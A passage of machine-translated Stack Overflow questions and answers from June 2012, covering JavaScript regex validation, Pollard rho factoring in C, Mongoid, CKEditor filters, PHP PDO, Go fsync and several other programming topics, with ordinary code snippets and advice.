    var emailRegex = new RegExp(/^((([a-z]|\d|[!#\$%&'\*\+\-\/=\?\^_`{\|}~]|[\u00A0-\uD7FF\uF900-\uFDCF\uFDF0-\uFFEF])+(\.([a-z]|\d|[!#\$%&'\*\+\-\/=\?\^_`{\|}~]|[\u00A0-\uD7FF\uF900-\uFDCF\uFDF0-\uFFEF])+)*)|((\x22)((((\x20|\x09)*(\x0d\x0a))?(\x20|\x09)+)?(([\x01-\x08\x0b\x0c\x0e-\x1f\x7f]|\x21|[\x23-\x5b]|[\x5d-\x7e]|[\u00A0-\uD7FF\uF900-\uFDCF\uFDF0-\uFFEF])|(\\([\x01-\x09\x0b\x0c\x0d-\x7f]|[\u00A0-\uD7FF\uF900-\uFDCF\uFDF0-\uFFEF]))))*(((\x20|\x09)*(\x0d\x0a))?(\x20|\x09)+)?(\x22)))@((([a-z]|\d|[\u00A0-\uD7FF\uF900-\uFDCF\uFDF0-\uFFEF])|(([a-z]|\d|[\u00A0-\uD7FF\uF900-\uFDCF\uFDF0-\uFFEF])([a-z]|\d|-|\.|_|~|[\u00A0-\uD7FF\uF900-\uFDCF\uFDF0-\uFFEF])*([a-z]|\d|[\u00A0-\uD7FF\uF900-\uFDCF\uFDF0-\uFFEF])))\.)+(([a-z]|[\u00A0-\uD7FF\uF900-\uFDCF\uFDF0-\uFFEF])|(([a-z]|[\u00A0-\uD7FF\uF900-\uFDCF\uFDF0-\uFFEF])([a-z]|\d|-|\.|_|~|[\u00A0-\uD7FF\uF900-\uFDCF\uFDF0-\uFFEF])*([a-z]|[\u00A0-\uD7FF\uF900-\uFDCF\uFDF0-\uFFEF])))\.?$/i);

    if(!emailRegex.test(email)){
        email.addClass("error");
        emailInfo.text("Ogiltig email!");
        nameInfo.add("error");
        return false;

    }
    else{
        email.removeClass("error");
        emailInfo.text("OK!");
        emailInfo.removeClass("error");
        return true;
    }
} 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-06-02T12:39:51.053

你可以试试这个：

```
var emailRegex = new RegExp("^((([a-z]|\d|[!#\$%&'\*\+\-\/=\?\^_`{\|}~]|[\u00A0-\uD7FF\uF900-\uFDCF\uFDF0-\uFFEF])+(\.([a-z]|\d|[!#\$%&'\*\+\-\/=\?\^_`{\|}~]|[\u00A0-\uD7FF\uF900-\uFDCF\uFDF0-\uFFEF])+)*)|((\x22)((((\x20|\x09)*(\x0d\x0a))?(\x20|\x09)+)?(([\x01-\x08\x0b\x0c\x0e-\x1f\x7f]|\x21|[\x23-\x5b]|[\x5d-\x7e]|[\u00A0-\uD7FF\uF900-\uFDCF\uFDF0-\uFFEF])|(\\([\x01-\x09\x0b\x0c\x0d-\x7f]|[\u00A0-\uD7FF\uF900-\uFDCF\uFDF0-\uFFEF]))))*(((\x20|\x09)*(\x0d\x0a))?(\x20|\x09)+)?(\x22)))@((([a-z]|\d|[\u00A0-\uD7FF\uF900-\uFDCF\uFDF0-\uFFEF])|(([a-z]|\d|[\u00A0-\uD7FF\uF900-\uFDCF\uFDF0-\uFFEF])([a-z]|\d|-|\.|_|~|[\u00A0-\uD7FF\uF900-\uFDCF\uFDF0-\uFFEF])*([a-z]|\d|[\u00A0-\uD7FF\uF900-\uFDCF\uFDF0-\uFFEF])))\.)+(([a-z]|[\u00A0-\uD7FF\uF900-\uFDCF\uFDF0-\uFFEF])|(([a-z]|[\u00A0-\uD7FF\uF900-\uFDCF\uFDF0-\uFFEF])([a-z]|\d|-|\.|_|~|[\u00A0-\uD7FF\uF900-\uFDCF\uFDF0-\uFFEF])*([a-z]|[\u00A0-\uD7FF\uF900-\uFDCF\uFDF0-\uFFEF])))\.?$","i"); 
```

或者：

```
var emailRegex = /^((([a-z]|\d|[!#\$%&'\*\+\-\/=\?\^_`{\|}~]|[\u00A0-\uD7FF\uF900-\uFDCF\uFDF0-\uFFEF])+(\.([a-z]|\d|[!#\$%&'\*\+\-\/=\?\^_`{\|}~]|[\u00A0-\uD7FF\uF900-\uFDCF\uFDF0-\uFFEF])+)*)|((\x22)((((\x20|\x09)*(\x0d\x0a))?(\x20|\x09)+)?(([\x01-\x08\x0b\x0c\x0e-\x1f\x7f]|\x21|[\x23-\x5b]|[\x5d-\x7e]|[\u00A0-\uD7FF\uF900-\uFDCF\uFDF0-\uFFEF])|(\\([\x01-\x09\x0b\x0c\x0d-\x7f]|[\u00A0-\uD7FF\uF900-\uFDCF\uFDF0-\uFFEF]))))*(((\x20|\x09)*(\x0d\x0a))?(\x20|\x09)+)?(\x22)))@((([a-z]|\d|[\u00A0-\uD7FF\uF900-\uFDCF\uFDF0-\uFFEF])|(([a-z]|\d|[\u00A0-\uD7FF\uF900-\uFDCF\uFDF0-\uFFEF])([a-z]|\d|-|\.|_|~|[\u00A0-\uD7FF\uF900-\uFDCF\uFDF0-\uFFEF])*([a-z]|\d|[\u00A0-\uD7FF\uF900-\uFDCF\uFDF0-\uFFEF])))\.)+(([a-z]|[\u00A0-\uD7FF\uF900-\uFDCF\uFDF0-\uFFEF])|(([a-z]|[\u00A0-\uD7FF\uF900-\uFDCF\uFDF0-\uFFEF])([a-z]|\d|-|\.|_|~|[\u00A0-\uD7FF\uF900-\uFDCF\uFDF0-\uFFEF])*([a-z]|[\u00A0-\uD7FF\uF900-\uFDCF\uFDF0-\uFFEF])))\.?$/i; 
```

[RegExp](https://developer.mozilla.org/en/JavaScript/Reference/Global_Objects/RegExp)没有这样的构造函数：

```
RegExp( regexp_obj ) 
```

相反，它有这个：

```
RegExp( regexp_string, regexp_flags) 
```

**更新：**您还需要将文本传递给`test`函数，而不是 jquery 对象，例如`email`：

```
if( !emailRegex.test(email.val()) ){ 
```

# c - Pollard Rho 分解方法在 C 中的实现

> ID：10862358
> 
> 赞同：1
> 
> 时间：2012-06-02T12:33:26.850
> 
> 标签：c, algorithm, factorization

谁能帮我完成 pollard rho 的实施？我已经在 C 中实现了这一点。它适用于最多 10 位的数字，但它无法处理更大的数字。

请帮我改进它以执行高达 18 位的数字分解。我的代码是[这样](http://ideone.com/esBXz)的：

```
#include<stdio.h>
#include<math.h>
int gcd(int a, int b)
{
    if(b==0) return a ;
    else
    return(gcd(b,a%b)) ;
}

long long int mod(long long int a , long long int b , long long int n )
{    
     long long int x=1 , y=a ;
     while(b>0)
     {
        if(b%2==1)  x = ((x%n)*(y%n))%n ;
        y = ((y%n)*(y%n))%n ;
         b/=2 ;
     }
     return x%n ;
}

int isprimes(long long int u)
{  
    if(u==3)
    return 1 ;
     int a = 2 , i ;
     long long int k , t = 0 , r , p ;
     k = u-1 ;
     while(k%2==0)
     { k/=2 ; t++ ; }

         while(a<=3)                                                              /*der are no strong pseudoprimes common in base 2 and base 3*/
         {   
         r = mod(a,k,u) ;
             for(i = 1 ; i<=t ; i++)
             {
                  p = ((r%u)*(r%u))%u ;
                  if((p==1)&&(r!=1)&&(r!=(u-1)))
                  {  return 0 ; }
                  r = p ;
             }
          if(p!=1)
          return 0 ;
         else
          a++ ;
         } 

          if(a==4)
          return 1 ;

}

long long int pol(long long int u)
{ 
  long long int x = 2 , k , i , a , y , c , s;
  int d = 1 ;
   k = 2 ;
   i = 1 ;
   y = x ;
   a = u ;
   if(isprimes(u)==1)
   { 
     return 1;
   }
   c=-1 ;
   s = 2 ;
   while(1)
   {
     i++;
     x=((x%u)*(x%u)-1)% u ;

     d = gcd(abs(y-x),u) ;

     if(d!=1&&d!=u)
     { printf("%d ",d);
       while(a%d==0) { a=a/d;  }

        x = 2 ;
        k = 2 ;
        i = 1 ;
        y = x ;
        if(a==1)
        { return 0 ; }
        if(isprimes(a)!=0)
        { return a ; }
        u=a ;

     }
     if(i==k)
     {y = x ; k*=2 ; c = x ;}                                                       /*floyd cycle detection*/
        if(c==x)                                                                 
     { x = ++s ; }
    }
    return ;

}

int main()
{
   long long int t ;
    long long int i , n , j , k , a , b  , u ;
    while(scanf("%lld",&n)&&n!=0)
    { u = n ; k = 0 ;
    while(u%2==0)
       {  u/=2 ; k = 1 ; }
      if(k==1) printf("2 ") ;
      if(u!=1)
      t = pol(u) ;
        if(u!=1) 
      {
           if(t==1)
           { printf("%lld",u) ; }
           else
           if(t!=0)
           { printf("%lld",t) ; }
      }
          printf("\n");
    }
    return 0;
} 
```

对不起，长代码.....我是一个新的编码员。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-06-02T15:08:55.303

当您将两个数字相乘时`m`，中间产品可能会变成近似`m^2`。所以如果使用 64 位无符号整数类型，它可以处理的最大模数是`2^32`，如果模数较大，可能会发生溢出。模数稍微大一点的情况很少见，但这只会使其不那么明显，如果模数允许溢出，你不能指望幸运。

如果您选择一个代表`m`绝对值的残差类模数`m/2`或等效值，则可以将更大的范围扩大两倍：

```
uint64_t mod_mul(uint64_t x, uint64_t y, uint64_t m)
{
    int neg = 0;
    // if x is too large, choose m-x and note that we need one negation for that at the end
    if (x > m/2) {
        x = m - x;
        neg = !neg;
    }
    // if y is too large, choose m-y and note that we need one negation for that at the end
    if (y > m/2) {
        y = m - y;
        neg = !neg;
    }
    uint64_t prod = (x * y) % m;
    // if we had negated _one_ factor, and the product isn't 0 (mod m), negate
    if (neg && prod) {
        prod = m - prod;
    }
    return prod;
} 
```

因此，这将允许高达`2^33`64 位无符号类型的模数。不是很大的一步。

该问题的推荐解决方案是使用大整数库，例如 GMP 在大多数（如果不是全部）Linux 发行版上都可以作为分发包使用，并且（相对）可以轻松安装在 Windows 上。

如果这不是一个选项（真的，你确定吗？），您可以`2^63`使用俄罗斯农民乘法使其适用于更大的模数（最多适用于无符号 64 位整数类型）：

```
x * y = 2 * (x * (y/2)) + (x * (y % 2)) 
```

所以对于计算，你只需`2*(m-1)`要不溢出。

```
uint64_t mod_mult(uint64_t x, uint64_t y, uint64_t m)
{
    if (y == 0) return 0;
    if (y == 1) return x % m;
    uint64_t temp = mod_mult(x,y/2,m);
    temp = (2*temp) % m;
    if (y % 2 == 1) {
        temp = (temp + x) % m;
    }
    return temp;
} 
```

但是请注意，此算法需要 O(log y) 步，因此在实践中相当慢。对于较小的`m`您可以加快速度，如果`2^k*(m-1)`没有溢出，您可以按`k`位而不是单个位 ( `x*y = ((x * (y >> k)) << k) + (x * (y & ((1 << k)-1)))`) 进行，如果您的模数从不大于 48 或 56 位，这是一个很好的改进。

使用模乘的变体，您的算法将适用于更大的数字（但它会明显变慢）。您还可以尝试测试模数的大小和/或因素以确定使用哪种方法，如果`m < 2^32`或`x < (2^64-1)/y`，则简单即可`(x * y) % m`。

# ruby-on-rails-3 - 在 embeds_many mongoid 关系中推送附加值的问题

> ID：10862359
> 
> 赞同：1
> 
> 时间：2012-06-02T12:34:02.730
> 
> 标签：ruby-on-rails-3, mongoid

很长一段时间以来，我一直在为此烦恼。不确定我的方法是否正确，或者是否无法使用 mongoid。所以没有进一步的告别，这里是问题：

我有以下2个模型：

```
def user
  embeds_many :needs, :class_name => "Property"
  embeds_many :skills, :class_name => "Property"
end

def property

end 
```

当然，这两种模型都有其他代码，但为简洁起见，我跳过了它。使用这种结构，我可以在我的用户模型上访问/添加“属性”数据作为嵌入的“需求”和“技能”。像这样的东西完美无缺

```
User.first.update_attributes(skills: [Property.first]) 
```

问题是这样的东西不起作用。

```
User.first.skills.push(Property.first)
User.first.skills << Property.first 
```

没有错误。上述两个语句在控制台上都返回 true。但是这些值不会持续存在于数据库中。

我基本上想要一个可以独立于用户模型维护/创建的属性模型，这就是我的代码中缺少属性上的“embedded_in”的原因。

问题是，我做得对吗？或者我应该以不同的方式来设计这些模型？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-06-04T13:30:54.717

凯奇是对的。如果您希望持久性正常工作，则需要将 embedded_in 放在 Property 模型上。如果要在 User 模型之外管理 Property 的生命周期，则必须使用“has_many”。

请添加更多详细信息，以说明您正在做的事情的目的究竟是什么。我要做一些假设——

*   需求和技能是价值的全球列表，应单独维护
*   用户可以拥有一部分技能和需求
*   您希望将需求和技能存储为“纯字符串”而不是引用，这样您就可以在不引用需求和技能集合的情况下查询它们。这减少了一个查询

如果以上是正确的，那么你可以使用自定义键来存储需求和技能——

```
class Property
  include Mongoid::Document
  field :text, :type => String
  field :_id, type: String, default ->{ text }
end

class User
  include Mongoid::Document
  has_many :needs, :class_name => "Property"
  has_many :skills, :class_name => "Property"
end 
```

现在你可以做类似的事情 -

```
User.first.need_ids 
```

这将给出需要的文本，并且您可以避免另一个查询。 **注意**- 如果您的“属性”对象是可变的，这可能会非常危险。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-06-03T02:34:31.747

对于解决方案尝试这样做

```
u = User.first
u.skills.push(Property.first)
u.skills << Property.first 
```

它会正常工作。

# html - CKEditor：插入图像时的自定义 HTML

> ID：10862363
> 
> 赞同：3
> 
> 时间：2012-06-02T12:35:15.460
> 
> 标签：html, image, ckeditor

我正在使用 CKEditor 作为我网站的富文本编辑器。在那个站点上，我还有一个自定义图像管理器，我在 CKEditor 中使用“filebrowserImageBrowseUrl”配置参数。这会在图像属性中放置一个“浏览服务器”按钮，让我从图像管理器中选择一个文件。这工作得很好。

但是，当我从图像管理器中插入图像并在 CKEditor 中调整它的大小时，这只会将样式属性添加到 img 标签。当人们浏览我的网站时，他们会看到我想要的图像大小，但他们也必须下载大量数据，即使图像大小只是缩略图。

当您将宽度和高度作为查询字符串放入图像 url 时，我的图像管理器会自动调整大小。

如何覆盖 CKEditor 创建的 img 标签，以便将选定的宽度和高度作为查询变量放入 img 标签中的 src 属性以及 style 属性（以便 CKEditor 仍然知道图像的大小）？

我确实在这里找到了另一个问题：[CKEditor: Customized HTML on inserting an image](https://stackoverflow.com/questions/5024371/ckeditor-customized-html-on-inserting-an-image) 但是该问题的答案似乎不起作用，因为该示例中的宽度和高度包含图像的原始大小而不是自定义大小。我还从这些方法中调试了各种变量，但没有找到自定义大小。

所以问题仍然存在：如何覆盖 CKEditor 的输出 HTML 以将图像的大小作为查询变量以及 CKEditor 默认放置的样式属性？

**更新**

为了使下面的所有评论更全面，这里有一个精简版：

```
CKEDITOR.on('instanceReady', function (ev) {
    var editor = ev.editor,
        dataProcessor = editor.dataProcessor,
        htmlFilter = dataProcessor && dataProcessor.htmlFilter;

    htmlFilter.addRules( {
        elements : {
            $ : function( element ) {
                // Output dimensions of images as width and height attributes on src
                if ( element.name == 'img' ) {
                    var style = element.attributes.style;
                    if (style) {
                        // Get the width from the style.
                        var match = /(?:^|\s)width\s*:\s*(\d+)px/i.exec( style ),
                            width = match && match[1];

                        // Get the height from the style.
                        match = /(?:^|\s)height\s*:\s*(\d+)px/i.exec( style );
                        var height = match && match[1];

                        var imgsrc = element.attributes.src + "?width=" + width + "&height=" + height;

                        element.attributes.src = imgsrc;
                        element.attributes['data-cke-saved-src'] = imgsrc;
                    }
                }
            }
        }
    });
}); 
```

每当 CKEditor 生成实际的 HTML 时，都会运行此代码，当您通过单击“源”按钮查看源代码或执行该页面的 HTTP POST 时会发生这种情况。

不过，一个小警告。上面的代码将继续为每次单击“源”按钮或每次回发附加宽度和高度查询字符串，因此您可能需要添加一些额外的逻辑来过滤掉宽度和高度查询字符串，然后再将它们附加到src 属性。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-06-03T18:00:37.240

如果您查看 CKEditor 副本中的[输出 HTML 示例](http://nightly.ckeditor.com/latest/ckeditor/_samples/output_html.html)，您可以看到它如何使用 htmlFilter 更改图像以将尺寸放入属性中。基于该代码，您可以编写自己的代码，以便更改图像的 url。

请注意：URL 受到保护以避免浏览器出现问题，因此修改“src”属性可能还不够。查看您正在修改的对象的属性。

# c - 比较两个字符串并删除常见字母

> ID：10862364
> 
> 赞同：-3
> 
> 时间：2012-06-02T12:35:30.810
> 
> 标签：c, string, compare, character

我的练习有问题，所以这里是练习：

> 编写一个程序，通过屏幕上的适当消息来帮助读取两个字符串`str1`，`str2`甚至是从键盘给出的字符串，然后删除变量中的所有字母，这些字母`str1`也出现在变量中`str2`。显示屏显示检查程序正确运行的最终结果。

这是我到目前为止所做的（我只能使用这些库）：

```
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

int main()
{
    char str1[80], str2[80];
    int megethos1, megethos2,max,i,j;
    printf ("Give the first string: ");
    scanf ("%s", &str1);
    printf ("Give the second string: ");
    scanf ("%s", &str2);

    size1= strlen(str1);
    size2= strlen(str2);

    for (j=0; j<=megethos2; j++){
        for (i=0; i<=megethos1; i++){
             if (str2[(strlen(str2)-j)]=str1[(strlen(str1)-i)])
                 str1[(strlen(str1)-i)]=' ';
        }
    }

    printf (str1);

    system("pause");

} 
```

所以有人可以帮助我吗？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-06-02T12:40:00.587

```
 if (str2[(strlen(str2)-j)]=str1[(strlen(str1)-i)])
         str1[(strlen(str1)-i)]=' '; 
```

When `i`is `0`then`str2[(strlen(str1)]`是您要覆盖的字符串的终止空字符`' '`。你需要一个`- 1`地方。

正如[@PaulR](https://stackoverflow.com/users/253056/paul-r)在评论中指出的那样，第一个`=`应该是`==`.

另请注意，您必须使用`scanf("%s", str)`而不是`scanf("%s", &str)`.

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-06-02T18:50:25.240

```
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

int main(){
    char str1[80], str2[80];
    int size1,size2, i,j;
    printf ("Give the first string: ");
    scanf ("%s", str1);
    printf ("Give the second string: ");
    scanf ("%s", str2);

    size1= strlen(str1);
    size2= strlen(str2);

    for (j=0; j<size2; j++){
        for (i=0; i<size1; i++){
             if (str2[j]==str1[i])
                 str1[i]=' ';
        }
    }

    printf("%s\n", str1);

    system("pause");

} 
```

* * *

## 回答 #3

> 赞同：-1
> 
> 时间：2012-06-02T12:44:59.183

您的问题是关于 C 还是 C#？

对于 C#，您可以使用 LINQ：

```
var s1 = "string new";
var s2 = "string";

var excludedCharText =
  s1
    .Where(c => s2.All(o => o != c))
    .Select(c => c.ToString())
    .Aggregate((prev, next) => prev + next); 
```

# actionscript-3 - 如何合并两个数组集合并且没有重复？

> ID：10862365
> 
> 赞同：0
> 
> 时间：2012-06-02T12:35:55.423
> 
> 标签：actionscript-3, flex4

我想要合并 2 个数组集合，其中不允许重复，

```
var ac1:ArrayCollection = new ArrayCollection([ {s:"4",e:"8"}, {s:"9",e:"10"}, ]);
var ac2:ArrayCollection = new ArrayCollection([ {s:"2",e:"3"}, {s:"4",e:"8"}, {s:"9",e:"10"}, {s:"11",e:"12"}, ]); 
```

我怎样才能有效地做到这一点

谢谢，

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-06-02T13:38:32.487

有关更多属性，请使用以下内容：

```
function equals(o1:Object, o2:Object):Boolean
{
    if (o1 == o2) return true;
    if (!o1 || !o2) return false;

    for (var key:String in o1)
    {
        if (!(key in o2)) return false;
        if (o1[key] != o2[key]) return false;
    }

    return true;
} 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-06-02T13:05:35.787

错误，我不是一个动作脚本人，但这是一个经典问题 - 按升序对两个数组进行排序，然后将它们送入您的第三个数组，始终从两个源数组中选择最小值并将写入转义到目标，如果什么你会写已经在列表的末尾 - 你最终会得到 n 个输入数组中唯一值的排序列表

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-06-02T13:10:34.790

也许这是一个很好的开端。

```
function equals(o1:Object, o2:Object)
{
    return (o1 && o2) && (o1 != o2) && (o1.s != o2.s) && (o1.e != o2.e);
}

function merge(a:Array, b:Array):Array
{
    const source = [];
    var isContained:Boolean = false;
    for (var i:int; i< a.length;i++) {
        isContained = false
        for (var j:int; j< b.length;j++) {
            if (equals(a[i], b[j])) {
                isContained = true;
                break;
            }
        }
        if (!isContained) {
            source.push(a[1]);
        }
    }
    return source.concat(b);
} 
```

# php - Yii 框架：AuthManager

> ID：10862369
> 
> 赞同：0
> 
> 时间：2012-06-02T12:36:26.537
> 
> 标签：php, yii

我正在关注这个小指南，如何设置 RBAC。[本指南](http://www.yiiframework.com/wiki/65/how-to-setup-rbac-with-a-php-file/) 我被困在这一点上：

$ cp auth.txt auth.php

这样做有什么意义？为什么我不能只制作一个 php 文件并将我的代码放在那里。这只是使用 .php 分机制作相同的文件。

所以我做了本指南中的所有事情。现在我有以下错误：未知的授权项目“阅读器”。当我尝试登录时，我得到了这个。知道吗？现在卡了几个小时。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-06-02T13:49:02.370

解决它。auth.php 文件必须在数据文件夹中。并且应该有`<?php ?>`标签。

# php - 可捕获的致命错误：PDOStatement 类的对象无法转换为字符串

> ID：10862371
> 
> 赞同：6
> 
> 时间：2012-06-02T12:36:39.753
> 
> 标签：php, mysql, pdo

尝试将数据库上的值与表单中传递的值进行匹配以检查用户是否存在时，出现以下错误。

> 可捕获的致命错误：PDOStatement 类的对象无法转换为字符串

这是我正在使用的代码：

```
//Check users login details
    function match_login($username, $password){
            //If the button has been clicked get the variables
            try{

                $dbh = new PDO("mysql:host=localhost;dbname=mjbox","root", "usbw");

            } catch( PDOException $e ) {

                echo $e->getMessage();

            }
            $stmt = $dbh->prepare("SELECT * FROM mjbox WHERE username=? AND password=?");
            $stmt->bindParam(1, $username);
            $stmt->bindParam(2, $password);
            $stmt->execute();

            $result = mysql_query($stmt);
            if( mysql_num_rows($result) > 0 ){

                echo 'There is a match!';
            }else{
                echo 'nooooo';
            }
    } 
```

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2012-06-02T12:38:39.067

`mysql_query()`和 PDO 不兼容，不能一起使用。您正在尝试将`mysql_query()`需要字符串的 PDO 语句对象传递给该对象。相反，您想`$stmt`通过 PDO 的一种获取方法从其中获取行，或者使用以下命令检查返回的行数[`rowCount()`](http://www.php.net/manual/en/pdostatement.rowcount.php)：

```
$stmt = $dbh->prepare("SELECT * FROM mjbox WHERE username=? AND password=?");
$stmt->bindParam(1, $username);
$stmt->bindParam(2, $password);

if ($stmt->execute()) {

  // get the rowcount
  $numrows = $stmt->rowCount();
  if ($numrows > 0) {
    // match
    // Fetch rows
    $rowset = $stmt->fetchAll();
  }
  else {
    // no rows
  }
} 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-06-02T13:58:07.700

MySQL 和 PHP5/PDO 不能很好地返回行数。在你的新 PDO() 之后，发出：

```
$dbh->setAttribute(PDO::MYSQL_ATTR_FOUND_ROWS, true); 
```

然后发出您的查询...

```
$stmt = $dbh->prepare("SELECT * FROM mjbox WHERE username=? AND password=?");
$stmt->bindParam(1, $username);
$stmt->bindParam(2, $password);
$stmt->execute();

// number of rows returned
if($stmt->rowCount()){
    // ... matches
}else{
    // .. no match
} 
```

否则，您的 rowCount 将是 bool 0 或 null/throw 错误。

# go - 何时在 Go 中刷新文件？

> ID：10862375
> 
> 赞同：18
> 
> 时间：2012-06-02T12:37:14.017
> 
> 标签：go, synchronization, flush

什么时候需要[刷新](http://golang.org/pkg/os/#File.Sync)文件？
我从不这样做，因为我调用 File.Close 并且我认为它会自动刷新，不是吗？

* * *

## 回答 #1

> 赞同：26
> 
> 时间：2012-06-05T00:42:52.397

您会注意到 os.File 没有 .Flush() 因为它不需要一个，因为它没有缓冲。写入它是直接写入文件的系统调用。

当您的程序退出时（即使它崩溃），它打开的所有文件都将被操作系统自动关闭，并且文件系统会在处理它时将您的更改写入磁盘（有时在程序退出后的几分钟内） .

调用 os.File.Sync() 将调用 fsync() 系统调用，这将强制文件系统将其缓冲区刷新到磁盘。即使系统关闭或操作系统崩溃，这也将保证您的数据在磁盘上并且是持久的。

你不需要调用 .Sync()

* * *

## 回答 #2

> 赞同：20
> 
> 时间：2012-06-02T13:12:34.337

见[这里](http://golang.org/src/pkg/os/file_posix.go?s=4048:4081#L140)。`File.Sync()`是[fsync](http://linux.die.net/man/2/fsync)的系统调用。您应该能够在该名称下找到更多信息。

请记住，`fsync`它与[fflush](http://linux.die.net/man/3/fflush)不同，并且不会在关闭之前执行。

您通常不需要调用它。无论如何，如果在此期间没有电源故障，文件将在一段时间后写入磁盘。

* * *

## 回答 #3

> 赞同：4
> 
> 时间：2018-01-29T21:13:47.520

看起来这里的大多数建议是不要调用 fsync()，但总的来说，这主要取决于您的应用程序要求。如果您正在处理关键文件的读/写，始终建议调用 fsync()。

[http://www.microhowto.info/howto/atomically_rewrite_the_content_of_a_file.html#idp31936](http://www.microhowto.info/howto/atomically_rewrite_the_content_of_a_file.html#idp31936)

链接，有关何时 file.Sync() 将提供帮助的更多详细信息。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-06-02T12:40:47.973

当您想尽可能确保数据完整性时。例如，如果您的程序在关闭文件之前崩溃了怎么办？

# linq - 实体框架查询：对象未设置为对象的实例

> ID：10862381
> 
> 赞同：0
> 
> 时间：2012-06-02T12:38:19.923
> 
> 标签：linq, entity-framework

打电话时`query.ToList()`我得到

> 你调用的对象是空的

对于`x.Gallons`，所有订单都设置了这个值，它不为空。此外，数据库表中有 2 个具有正确 ID 的 DProduct。有什么问题？

```
ProductSummaryCollection.Clear();

var query = from p in Repository.repository.ctx.DProduct
            join fo in Repository.repository.ctx.DFuelOrder.Include("DProduct")
            on p.ID equals fo.DProductID
            group fo by fo.DProduct into Prod
            select new DProductSummary
            { 
                Product = fo.DProduct,
                TotalGallons = (float)Prod.Sum(x => x.Gallons)
            };
try
{
    IList<DProductSummary> ps = query.ToList();

    foreach (DProductSummary dps in ps)
        ProductSummaryCollection.Add(dps);
}
catch (Exception exc)
{
} 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-06-02T13:25:38.033

看来你不能做以下两件事：

1.  在我的情况下，在 linq 查询中创建一个实体对象 DProduct
2.  即使您包含它，您也无法访问 linq 查询中的引用所以您必须改用连接 table.Propery。一个工作查询：

    ```
     var query = from fo in Repository.repository.ctx.DFuelOrder.Include("DProduct")
                    join p in Repository.repository.ctx.DProduct
                    on fo.DProductID equals p.ID
                    group fo by new { fo.DProductID, p.Name } into Prod
                    select new DProductSummary
                      {
                          ProductName = Prod.Key.Name,
                          TotalGallons = (float)Prod.Sum(x => x.Gallons)
                      }; 
    ```

# c++ - sal 缓冲区注释上的额外下划线（_）是什么？

> ID：10862385
> 
> 赞同：1
> 
> 时间：2012-06-02T12:39:10.787
> 
> 标签：c++, visual-c++, c++11, visual-c++-2010

我注意到以下陈述：

```
 __in HMODULE Module,
  __in PSTR ImportedModuleName,
  __in PSTR ImportedProcName,
  __in PVOID AlternateProc,
  __out_opt PVOID *OldProc 
```

在这些语句中，我看到两个 _ ，然后是单词 ( in )。

好吧，在查看 sal.h 时，我注意到已弃用的注释下：

```
// sal.h  
_in    : The function will only read from the buffer. The
caller must provide the buffer and initialize it. Cannot be used with _deref. 
```

好吧，只有一个下划线。我想知道为什么我在网上看到的所有源代码都有两个下划线（_ _ in）？就像我上面的陈述一样。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-06-02T14:51:24.267

`_in`您在 sal.h 中注意到注释是可能的注释部分之一。整个注释从一个额外的下划线开始。请参见以下示例：

```
NTDSAPI
void
WINAPI
DsFreeSpnArrayA(
    __in DWORD cSpn,
    __deref_in_ecount(cSpn) LPSTR *rpszSpn
    ); 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-06-02T13:41:12.930

当您拥有不支持名称空间的语言（C）或编译器功能（预处理器）时，这是军备竞赛的结果。或者在语言中添加非标准关键字，例如`__declspec`or `__attribute__`。以 _underscore 开头的标识符名称保留给实现者。不幸的是，戴那顶帽子的人不止一个。实现者可以是编写编译器及其 CRT 实现的程序员。或者它可以是一个编写核心库的程序员，比如sal.h。

或者它可以是你，你决定标题对于项目来说是如此核心，以至于你使用下划线来避免与其余代码的名称冲突。错误的决定，但很常见。

这迫使实现者使用多个下划线来避免名称冲突。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-06-02T12:56:10.013

注意那些不是语句，它们是参数声明。

所有以双下划线或单下划线后跟大写字母开头的名称都保留用于实现，即编译器、标准库和操作系统。这确保了如果用户定义了名为“in”的宏或全局变量，它不会破坏标准库，因为它使用 __in，并且用户和第三方库决**不能**使用这样的名称定义任何东西，所以 sal.h 的作者是行为良好且不使用保留名称。

您正在查看的双下划线标识符是 Microsoft 指示参数是否仅用于将值传递给函数，或者它是否也将数据传回（即在函数中设置的指针或引用参数）或两个都。Icm 很惊讶你在网上看到的*所有*代码都有它们，你一定只在看 Windows 代码，甚至可能只在 MSDN 上？

# java - 我们可以在 32 位 CentOS 上安装 64 位 jdk

> ID：10862394
> 
> 赞同：0
> 
> 时间：2012-06-02T12:40:23.400
> 
> 标签：java, installation, centos, jdk1.6, centos5

我有一个 64 位 jdk 1.6 安装程序。我可以使用 64 位安装程序在 centos 5.8 32 位上安装 java。如果是这样，实现相同的命令是什么。

TIA。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-06-02T12:43:29.500

简单地说，不，你不能。要运行 64 位应用程序，您需要一个支持 64 位应用程序的操作系统，而 32 位操作系统不这样做。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-06-02T12:44:15.570

不，您不能，因为 32 位操作系统不提供 64 位支持。反之亦然，您可以在 64 位 Linux 上安装 32 位程序。

特别是在 Java 程序的情况下，除了那些需要大量堆的程序之外，您应该能够在 32 位或 64 位 JDK 上运行，因此值得尝试安装 32 位 JDK 并尝试执行应用程序。

# cookies - 使用 Jmeter 进行功能测试

> ID：10862397
> 
> 赞同：0
> 
> 时间：2012-06-02T12:40:49.180
> 
> 标签：cookies, jmeter, functional-testing, beanshell

我想检查每次重新加载网页后 cookie 的值是否发生变化。我已经尝试使用 beanshell 来达到这个目的，但还没有成功。任何示例或教程？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-06-02T13:36:02.327

